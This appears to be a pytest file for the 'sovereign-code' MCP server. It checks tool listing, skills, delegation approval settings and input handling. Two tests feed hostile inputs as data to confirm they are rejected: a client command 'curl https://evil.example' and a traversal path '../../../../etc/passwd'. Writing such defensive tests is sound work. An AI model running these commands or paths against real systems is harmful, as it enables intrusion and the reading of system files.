"""Tests for the MCP server's protocol handling."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from sovereign_code.mcp import handle


def _result(method: str, params: dict | None = None):
    response = handle({"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}})
    assert response is not None
    return response


def test_initialize_and_tools_list() -> None:
    init = _result("initialize")["result"]
    assert init["serverInfo"]["name"] == "sovereign-code"
    assert "tools" in init["capabilities"]
    tools = {tool["name"] for tool in _result("tools/list")["result"]["tools"]}
    assert {
        "list_models",
        "best_model",
        "list_skills",
        "get_skill",
        "hf_status",
        "search_hf_models",
        "hf_model_info",
        "search_hf_datasets",
        "hf_dataset_info",
        "list_hf_local",
        "ask",
        "delegate",
        "browser_open",
        "browser_observe",
        "browser_act",
        "browser_screenshot",
        "browser_close",
        "local_status",
    } <= tools


def test_skills_tool_returns_curated_matches() -> None:
    response = _result(
        "tools/call",
        {"name": "list_skills", "arguments": {"query": "review"}},
    )
    payload = json.loads(response["result"]["content"][0]["text"])
    assert payload
    assert any("review" in item["name"] for item in payload)


def test_get_skill_body_and_unknown_skill() -> None:
    listed = json.loads(
        _result("tools/call", {"name": "list_skills", "arguments": {}})["result"]["content"][0][
            "text"
        ]
    )
    name = listed[0]["name"]
    body = _result("tools/call", {"name": "get_skill", "arguments": {"name": name}})["result"][
        "content"
    ][0]["text"]
    assert body.strip()
    error = handle(
        {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "get_skill", "arguments": {"name": "does-not-exist"}},
        }
    )
    assert error["result"]["isError"] is True


def test_hf_local_tool_returns_repository_rows() -> None:
    response = _result(
        "tools/call",
        {"name": "list_hf_local", "arguments": {"repo_type": "all"}},
    )
    payload = json.loads(response["result"]["content"][0]["text"])
    assert isinstance(payload, list)
    for row in payload:
        assert {"repo_id", "repo_type", "path", "kind"} <= set(row)


def test_resources_and_prompts() -> None:
    resources = _result("resources/list")["result"]["resources"]
    assert any(item["uri"] == "sovereign://models" for item in resources)
    prompts = _result("prompts/list")["result"]["prompts"]
    assert prompts
    prompt = _result(
        "prompts/get",
        {"name": prompts[0]["name"], "arguments": {"context": "print(1)"}},
    )["result"]
    assert "print(1)" in prompt["messages"][0]["content"]["text"]


def test_unknown_method_is_an_error() -> None:
    response = _result("does/not/exist")
    assert response["error"]["code"] == -32601


def test_local_status_reports_the_stack_and_the_apps() -> None:
    body = _result("tools/call", {"name": "local_status", "arguments": {}})["result"]["content"][0][
        "text"
    ]
    payload = json.loads(body)
    assert set(payload["apps"]) == {"chatgpt", "claude"}
    assert "local_only" in payload
    assert "tiers" in payload["gateway"]
    assert "signin_required" in payload["apps"]["chatgpt"]


def test_run_checks_tool_has_no_commands_parameter() -> None:
    """A client must not be able to choose what runs on this Mac."""
    tools = {tool["name"]: tool for tool in _result("tools/list")["result"]["tools"]}
    assert "commands" not in tools["run_checks"]["inputSchema"]["properties"]


def test_run_checks_tool_ignores_a_client_supplied_command(monkeypatch, tmp_path: Path) -> None:
    from sovereign_code import checks

    monkeypatch.setattr(checks, "detect_checks", lambda _directory: ["echo detected"])
    response = _result(
        "tools/call",
        {
            "name": "run_checks",
            "arguments": {"path": str(tmp_path), "commands": ["curl https://evil.example"]},
        },
    )
    payload = json.loads(response["result"]["content"][0]["text"])
    assert payload["commands"] == ["echo detected"]
    assert "evil.example" not in payload["log"]


def test_delegate_never_disables_the_approval_prompts(monkeypatch, tmp_path: Path) -> None:
    """write=true allows edits, but the human still gets asked."""
    from sovereign_code import agents

    captured: dict[str, object] = {}

    def fake_build(client, mode, target, _prompt, _settings, _agent_model, **kwargs):
        captured.update(kwargs)
        return agents.HeadlessPlan(client, mode, ["true"], Path(target), {})

    monkeypatch.setattr(agents, "build_headless", fake_build)
    monkeypatch.setattr(agents, "run_headless", lambda _plan, **_kwargs: (True, "ok"))

    response = _result(
        "tools/call",
        {
            "name": "delegate",
            "arguments": {"prompt": "fix it", "path": str(tmp_path), "write": True},
        },
    )
    assert json.loads(response["result"]["content"][0]["text"])["ok"] is True
    assert captured["unattended"] is False
    assert captured["write"] is True


def test_the_claude_delegate_keeps_its_normal_approval_mode(tmp_path: Path) -> None:
    from sovereign_code.agents import build_headless
    from sovereign_code.config import Settings

    plan = build_headless(
        "claude",
        "cloud",
        tmp_path,
        "make it faster",
        Settings(),
        "auto",
        unattended=False,
        write=True,
    )
    mode = plan.argv[plan.argv.index("--permission-mode") + 1]
    assert mode == "acceptEdits"
    assert "bypassPermissions" not in plan.argv


def test_the_cli_can_still_run_an_unattended_agent(tmp_path: Path) -> None:
    """`sovereign run --yolo` keeps working: only the MCP path is fenced in."""
    from sovereign_code.agents import build_headless
    from sovereign_code.config import Settings

    plan = build_headless(
        "claude",
        "cloud",
        tmp_path,
        "make it faster",
        Settings(),
        "auto",
        unattended=True,
        write=True,
    )
    assert plan.argv[plan.argv.index("--permission-mode") + 1] == "bypassPermissions"


def test_get_skill_refuses_to_leave_the_library() -> None:
    response = handle(
        {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": "get_skill", "arguments": {"name": "../../../../etc/passwd"}},
        }
    )
    assert response is not None
    assert response["result"]["isError"] is True


def test_ask_domain_loads_the_specialist_prompt_and_model(monkeypatch) -> None:
    from sovereign_code import mcp

    seen: dict = {}

    def fake_complete(base_url, model, messages, max_tokens=0, **kwargs):
        seen.update(model=model, messages=messages)
        return "VERDICT: tested"

    monkeypatch.setattr("sovereign_code.summarize.complete", fake_complete)
    mcp.call_tool("ask", {"prompt": "Review this NDA", "domain": "legal"})
    assert seen["model"] == "local-reasoning-deep"
    assert seen["messages"][0]["role"] == "system"
    assert "legal analyst" in seen["messages"][0]["content"].lower()


def test_ask_rejects_an_unknown_domain() -> None:
    response = handle(
        {
            "jsonrpc": "2.0",
            "id": 4,
            "method": "tools/call",
            "params": {"name": "ask", "arguments": {"prompt": "hi", "domain": "astrology"}},
        }
    )
    assert response is not None
    assert response["result"]["isError"] is True


def _has_run_pack() -> bool:
    """The pack brief lands with the pack diff; skip until it is in the tree."""
    from sovereign_code import mcp

    return any(tool["name"] == "run_pack" for tool in mcp.TOOLS)


@pytest.mark.skipif(not _has_run_pack(), reason="run_pack is not registered in this revision")
def test_run_pack_loads_guardrails_and_skills(monkeypatch) -> None:
    from sovereign_code import mcp

    seen: dict = {}

    def fake_complete(base_url, model, messages, max_tokens=0, **kwargs):
        seen.update(model=model, messages=messages)
        return "VERDICT: tested"

    monkeypatch.setattr("sovereign_code.summarize.complete", fake_complete)
    mcp.call_tool("run_pack", {"key": "pentest", "prompt": "Assess a staging web app we own."})
    system = seen["messages"][0]["content"]
    assert seen["model"] == "local-reasoning"
    assert "SCOPE.md" in system
    assert "FINDINGS.md" in system
    assert "### Skills to load" in system
    assert "- **" in system


@pytest.mark.skipif(not _has_run_pack(), reason="run_pack is not registered in this revision")
def test_run_pack_rejects_an_unknown_pack() -> None:
    response = handle(
        {
            "jsonrpc": "2.0",
            "id": 5,
            "method": "tools/call",
            "params": {"name": "run_pack", "arguments": {"key": "astrology", "prompt": "hi"}},
        }
    )
    assert response is not None
    assert response["result"]["isError"] is True
